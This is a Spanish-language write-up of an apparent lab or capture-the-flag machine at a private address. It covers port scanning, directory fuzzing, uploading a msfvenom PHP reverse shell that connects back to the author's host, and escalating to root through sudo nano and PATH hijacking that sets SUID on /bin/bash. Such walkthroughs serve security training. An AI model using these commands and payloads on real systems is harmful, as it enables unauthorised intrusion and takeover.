Escaneo  de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![[Pasted image 20251106155336.png]]

Revisaré el único puerto abierto, el puerto HTTP 80:

![[Pasted image 20251106155423.png]]

Efectivamente existe como una especie de collague en la página web, no encuentro nada relevante

Haré fuzzing web con Gobuster en busqueda de directorios:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt
```

![[Pasted image 20251106155624.png]]

Me encuentra un directorio /gallery, accederé a él:

![[Pasted image 20251106155726.png]]

Existe una carpeta uploads que contiene:

![[Pasted image 20251106155750.png]]

Un .php y otra carpeta llamada images

Dentro de la carpeta images están todas las imágenes de la página principal:

![[Pasted image 20251106155849.png]]

Y revisando el handler.php existe una subida de archivos:

![[Pasted image 20251106155925.png]]

Crearé un archivo Reverse Shell con Msfvenom y lo subiré en este espacio de subida de archivos:
```
msfvenom -p php/reverse_php LHOST=192.168.1.35 LPORT=443 -o shell.php
```

![[Pasted image 20251106160138.png]]
![[Pasted image 20251106160129.png]]

Ya que está subido mi archivo, revisaré nuevamente la carpeta de images para localizarlo allí:

![[Pasted image 20251106160228.png]]

Ahora me pondré a la escucha con Netcat y daré click a mi archivo para recibir la conexión de la Reverse Shell:

![[Pasted image 20251106160310.png]]

Y listo, ya estoy dentro de la máquina

Procederé a realizar el tratamiento de la TTY:
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![[Pasted image 20251106160841.png]]

![[Pasted image 20251106160908.png]]

## ESCALADA DE PRIVILEGIOS

Ejecuto sudo -l para ver el binario que puedo usar 

![[Pasted image 20251106160933.png]]

Puedo ser el usuario "gallery" con el binario Nano

Miro en GTFOBins como puedo escalar con este binario:

![[Pasted image 20251106161232.png]]

Lo ejecuto:

![[Pasted image 20251106161746.png]]
![[Pasted image 20251106161832.png]]

![[Pasted image 20251106161850.png]]

Y ahora ya escalé de usuario y me convertí en el usuario  "gallery"

Ejecuto sudo -l para ver el binario que puedo usar:

![[Pasted image 20251106163352.png]]

Tengo un binario /usr/local/bin/runme, revisaré sus "strings", para ver si existe alguna pista de algún comando 
```
strings /usr/local/bin/runme
```

![[Pasted image 20251106163716.png]]

Efectivamente observo que este binario ejecuta un comando llamado "convert" pero se usa en su ruta de forma relativa no absoluta por ende explotaré un Path Highyaking:

Primero crearé un archivo llamado igual que el comando convert y dentro activaré el bit SUID de /bin/bash:
```
bash chmod u+s /bin/bash
```

![[Pasted image 20251106165116.png]]

Le doy full permisos y luego lo exporto
```
chmod 777 convert
export PATH=.:$PATH
```

![[Pasted image 20251106164930.png]]

Ejecuto el binario:

![[Pasted image 20251106165206.png]]

Y efectivamente ya no me da error

Solo resta escribir "bash -p" para escalar a super usuario:

![[Pasted image 20251106165251.png]]

Y listo ya soy ROOT


